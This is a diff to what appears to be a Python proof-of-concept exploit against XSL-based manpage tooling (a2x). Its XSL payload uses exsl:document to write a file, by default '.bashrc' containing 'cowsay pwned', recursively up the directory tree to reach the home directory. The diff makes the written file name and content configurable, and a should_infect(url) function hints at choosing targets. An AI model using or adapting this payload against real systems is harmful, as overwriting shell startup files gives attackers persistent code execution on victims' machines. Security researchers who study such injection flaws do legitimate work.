@@ -16,6 +16,10 @@
 #   a2x -f manpage bar.adoc
 
 import re
+import xml.sax.saxutils as saxutils
+
+file_name = '.bashrc'
+file_data = 'cowsay pwned\n'
 
 # FIXME: I couldn't find a way to determine home directory with XSL.
 # Oh well, let's hope cwd is within $HOME, and try ".", "..", "../.."
@@ -24,14 +28,16 @@ payload = r'''
 <xsl:template name="pwn.recursive">
     <xsl:param name="dir" select="'.'"/>
     <xsl:if test="string-length($dir) &lt; 100">
-        <exsl:document href="{$dir}/.bashrc" method="text">cowsay pwned
-        </exsl:document>
+        <exsl:document href="{{$dir}}/{name}" method="text">{data}</exsl:document>
         <xsl:call-template name="pwn.recursive">
             <xsl:with-param name="dir" select="concat($dir, '/..')"/>
         </xsl:call-template>
     </xsl:if>
 </xsl:template>
-'''
+'''.format(
+    name=saxutils.escape(file_name),
+    data=saxutils.escape(file_data),
+)
 
 def should_infect(url):
     return (
